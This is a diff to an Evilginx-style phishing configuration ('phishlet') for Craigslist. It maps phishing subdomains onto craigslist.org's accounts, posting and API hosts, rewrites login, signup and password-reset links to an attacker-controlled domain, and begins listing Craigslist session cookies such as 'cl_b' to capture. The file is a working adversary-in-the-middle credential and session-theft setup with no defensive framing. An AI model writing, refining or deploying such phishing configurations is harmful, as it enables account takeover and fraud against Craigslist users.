@@ -3,16 +3,42 @@ name: Craigslist
 author: Anon369G
 min_ver: "3.0.0"
 proxy_hosts:
-  - {phish_sub: 'www', orig_sub: 'www', domain: 'craigslist.org', session: true, is_landing: true}
-  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'craigslist.org', session: true, is_landing: false}
-  - {phish_sub: 'region', orig_sub: '*', domain: 'craigslist.org', session: true, is_landing: false}
+  - {phish_sub: 'geo', orig_sub: 'geo', domain: 'craigslist.org', session: true, is_landing: false}
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'craigslist.org', session: true, is_landing: true}
   - {phish_sub: 'post', orig_sub: 'post', domain: 'craigslist.org', session: true, is_landing: false}
+  - {phish_sub: 'wapi', orig_sub: 'wapi', domain: 'craigslist.org', session: true, is_landing: false}
+  - {phish_sub: 'capi', orig_sub: 'capi', domain: 'craigslist.org', session: true, is_landing: false}
+  - {phish_sub: 'sapi', orig_sub: 'sapi', domain: 'craigslist.org', session: true, is_landing: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'craigslist.org', session: true, is_landing: true}
+
+
 sub_filters:
   - domain: 'craigslist.org'
     filters:
-      - {triggers_on: 'accounts.craigslist.org', orig_sub: 'accounts', domain: 'craigslist.org', search: 'https://{hostname}/login/home', replace: 'https://{hostname}/login/home', mimes: ['text/html', 'application/json', 'application/javascript']}
-      - {triggers_on: 'accounts.craigslist.org', orig_sub: 'accounts', domain: 'craigslist.org', search: 'https://{hostname}/login', replace: 'https://{hostname}/login', mimes: ['text/html', 'application/json', 'application/javascript']}
+      # Rewrite for accounts.craigslist.org
+      - {triggers_on: 'accounts.craigslist.org', orig_sub: 'accounts', domain: 'craigslist.org', search: 'https://accounts.craigslist.org', replace: 'https://accounts.{phish_sub}.{phish_domain}', mimes: ['text/html']}
+      - {triggers_on: 'accounts.craigslist.org', search: '/login', replace: 'https://accounts.{phish_sub}.{phish_domain}/login', mimes: ['text/html']}
+      - {triggers_on: 'accounts.craigslist.org', search: '/signup', replace: 'https://accounts.{phish_sub}.{phish_domain}/signup', mimes: ['text/html']}
+      - {triggers_on: 'accounts.craigslist.org', search: '/reset', replace: 'https://accounts.{phish_sub}.{phish_domain}/reset', mimes: ['text/html']}
 
+      # Rewrite for post.craigslist.org
+      - {triggers_on: 'post.craigslist.org', orig_sub: 'post', domain: 'craigslist.org', search: 'https://post.craigslist.org', replace: 'https://post.{phish_sub}.{phish_domain}', mimes: ['text/html']}
+      - {triggers_on: 'post.craigslist.org', search: '/c/lax', replace: '/c/lax', mimes: ['text/html']}
+
+      # Rewrite for wapi.craigslist.org
+      - {triggers_on: 'wapi.craigslist.org', orig_sub: 'wapi', domain: 'craigslist.org', search: 'https://wapi.craigslist.org', replace: 'https://wapi.{phish_sub}.{phish_domain}', mimes: ['application/json']}
+
+      # Rewrite for capi.craigslist.org
+      - {triggers_on: 'capi.craigslist.org', orig_sub: 'capi', domain: 'craigslist.org', search: 'https://capi.craigslist.org', replace: 'https://capi.{phish_sub}.{phish_domain}', mimes: ['application/json']}
+
+      # Rewrite for sapi.craigslist.org
+      - {triggers_on: 'sapi.craigslist.org', orig_sub: 'sapi', domain: 'craigslist.org', search: 'https://sapi.craigslist.org', replace: 'https://sapi.{phish_sub}.{phish_domain}', mimes: ['application/json']}
+
+      # Rewrite static links
+      - {triggers_on: 'www.craigslist.org', orig_sub: 'www', domain: 'craigslist.org', search: '/static/www/localStorage', replace: 'https://www.{phish_sub}.{phish_domain}/static/www/localStorage', mimes: ['text/html']}
+
+      # Rewrite help pages
+      - {triggers_on: 'www.craigslist.org', search: '/about/help/', replace: '/about/help/', mimes: ['text/html']}
 auth_tokens:
   cookies:
     - name: 'cl_b'
